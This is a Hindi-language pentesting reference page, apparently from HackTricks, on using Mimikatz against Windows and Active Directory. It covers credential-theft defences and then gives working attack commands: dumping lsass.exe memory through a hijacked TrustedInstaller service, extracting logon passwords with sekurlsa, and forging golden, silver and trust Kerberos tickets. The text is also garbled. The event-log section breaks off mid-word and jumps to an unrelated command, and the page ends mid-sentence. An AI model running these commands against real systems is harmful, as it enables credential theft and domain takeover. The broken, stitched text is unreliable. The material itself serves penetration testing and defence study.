# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण या हैकट्रिक्स को पीडीएफ में डाउनलोड** करना चाहते हैं? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटी**](https://opensea.io/collection/the-peass-family) संग्रह देखें
* [**आधिकारिक पीएस और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स रेपो** (https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को पीआर जमा करके**।

</details>

**यह पृष्ठ [adsecurity.org](https://adsecurity.org/?page\_id=1821) से आधारित है**। अधिक जानकारी के लिए मूल देखें!

## मेमोरी में एलएम और साफ-टेक्स्ट

Windows 8.1 और Windows Server 2012 R2 से आगे, क्रेडेंशियल चोरी से बचाव के लिए महत्वपूर्ण उपाय लागू किए गए हैं:

- **एलएम हैश और साफ-टेक्स्ट पासवर्ड** को सुरक्षित बनाने के लिए मेमोरी में नहीं स्टोर किया जाता है। एक विशिष्ट रजिस्ट्री सेटिंग, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ को एक DWORD मान `0` के साथ कॉन्फ़िगर करना होगा ताकि डाइजेस्ट प्रमाणीकरण को अक्षम करें, यह सुनिश्चित करता है कि "साफ-टेक्स्ट" पासवर्ड LSASS में कैश नहीं होते हैं।

- **LSA संरक्षा** को प्रावधान किया गया है ताकि स्थानीय सुरक्षा प्राधिकरण (LSA) प्रक्रिया को अनधिकृत मेमोरी पठन और कोड प्रवेश से बचाया जा सके। इसे LSASS को संरक्षित प्रक्रिया के रूप में चिह्नित करके प्राप्त किया जाता है। LSA संरक्षा को सक्रिय करने के लिए:
1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ पर रजिस्ट्री को संशोधित करके `RunAsPPL` को `dword:00000001` पर सेट करना।
2. प्रबंधित उपकरणों पर यह रजिस्ट्री परिवर्तन लागू करने के लिए एक समूह नीति वस्तु (GPO) का कार्यान्वयन करना।

इन सुरक्षाओं के बावजूद, Mimikatz जैसे उपकरण LSA संरक्षा को नष्ट कर सकते हैं विशेष ड्राइवर्स का उपयोग करके, हालांकि ऐसे कार्रवाई को इवेंट लॉग में लिखा जाने की संभावना है।

### SeDebugPrivilege हटाने का विरोध करना

प्रशासकों के पास सामान्यत: SeDebugPrivilege होता है, जो उन्हें कार्यक्रमों को डीबग करने की अनुमति देता है। इस विशेषाधिकार को अनधिकृत मेमोरी डंप्स को रोकने के लिए प्रतिबंधित किया जा सकता है, जो हमलावारों द्वारा क्रेडेंशियल्स को मेमोरी से निकालने के लिए एक सामान्य तकनीक है। हालांकि, इस विशेषाधिकार को हटाने के बावजूद, TrustedInstaller खाता एक कस्टमाइज़्ड सेवा कॉन्फ़िगरेशन का उपयोग करके मेमोरी डंप कर सकता है:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
यह `lsass.exe` मेमोरी को एक फ़ाइल में डंप करने की अनुमति देता है, जिसे फिर एक अन्य सिस्टम पर विश्लेषित किया जा सकता है ताकि क्रेडेंशियल्स निकाले जा सकें:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz विकल्प

Mimikatz में इवेंट लॉग टैम्परिंग में दो मुख्य क्रियाएँ शामिल हैं: इवेंट लॉग्स को साफ करना और नए इवेंट्स का लॉगिंग रोकने के लिए इव
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### सिल्वर टिकट निर्माण

सिल्वर टिकट विशिष्ट सेवाओं तक पहुंच प्रदान करता है। मुख्य कमांड और पैरामीटर:

- कमांड: गोल्डन टिकट के समान है लेकिन विशिष्ट सेवाओं को लक्ष्य बनाता है।
- पैरामीटर:
- `/service`: लक्ष्य बनाने के लिए सेवा (जैसे, cifs, http)।
- गोल्डन टिकट के समान अन्य पैरामीटर।

उदाहरण:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### विश्वास टिकट निर्माण

विश्वास टिकट को विश्वास संबंधों का उपयोग करके डोमेन के अधिकारों तक पहुंचने के लिए उपयोग किया जाता है। मुख्य कमांड और पैरामीटर:

- कमांड: गोल्डन टिकट के लिए समान, लेकिन विश्वास संबंधों के लिए।
- पैरामीटर:
- `/target`: लक्षित डोमेन का FQDN।
- `/rc4`: विश्वास खाते के NTLM हैश।

उदाहरण:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### अतिरिक्त केरबेरोस कमांड

- **टिकट सूचीकरण**:
- कमांड: `kerberos::list`
- वर्तमान उपयोगकर्ता सत्र के लिए सभी केरबेरोस टिकट सूचीबद्ध करता है।

- **कैश पास**:
- कमांड: `kerberos::ptc`
- कैश फ़ाइल से केरबेरोस टिकट इंजेक्ट करता है।
- उदाहरण: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **टिकट पास**:
- कमांड: `kerberos::ptt`
- दूसरे सत्र में केरबेरोस टिकट का उपयोग करने की अनुमति देता है।
- उदाहरण: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **टिकट सफाई**:
- कमांड: `kerberos::purge`
- सत्र से सभी केरबेरोस टिकट को साफ करता है।
- संघर्ष से बचने के लिए टिकट मानिपुलेशन कमांड का उपयोग करने से पहले उपयोगी।


### सक्रिय निर्देशिका दुरुपयोग

- **DCShadow**: एक मशीन को अस्थायी रूप से एक डीसी के रूप में काम करने के लिए एडी ऑब्ज
